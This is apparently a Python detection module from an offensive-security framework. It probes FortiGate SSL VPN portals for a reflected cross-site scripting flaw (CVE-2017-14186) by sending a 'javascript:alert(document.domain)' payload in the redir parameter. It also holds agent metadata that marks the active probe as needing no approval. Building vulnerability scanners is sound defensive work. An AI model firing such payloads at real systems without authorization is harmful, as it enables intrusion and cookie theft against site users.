#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""FortiGate FortiOS through SSL VPN Web Portal contains a cross-site scripting vulnerability."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'FortiGate FortiOS SSL VPN Web Portal - Cross-Site Scripting Detection',
        'description': 'FortiGate FortiOS through SSL VPN Web Portal contains a cross-site scripting vulnerability. The login redir parameter is not sanitized, so an attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks such as a URL redirect. Affected versions are 6.0.0 to 6.0.4, 5.6.0 to 5.6.7, and 5.4 and below.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'fortigate', 'xss', 'fortinet', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.fortiguard.com/psirt/FG-IR-17-242',
            'https://fortiguard.com/advisory/FG-IR-17-242',
            'https://web.archive.org/web/20210801135714/http://www.securitytracker.com/id/1039891',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-14186',
            'http://www.securitytracker.com/id/1039891',
        ],
        'cve': 'CVE-2017-14186',
    }

    def run(self):
        r = self.http_request(method="GET", path='/remote/loginredir?redir=javascript:alert(document.domain)', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('location=decodeURIComponent("javascript%3Aalert%28document.domain%29"',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="FortiGate FortiOS SSL VPN Web Portal - Cross-Site Scripting detected",
                path='/remote/loginredir?redir=javascript:alert(document.domain)',
            )
            return True
        return False

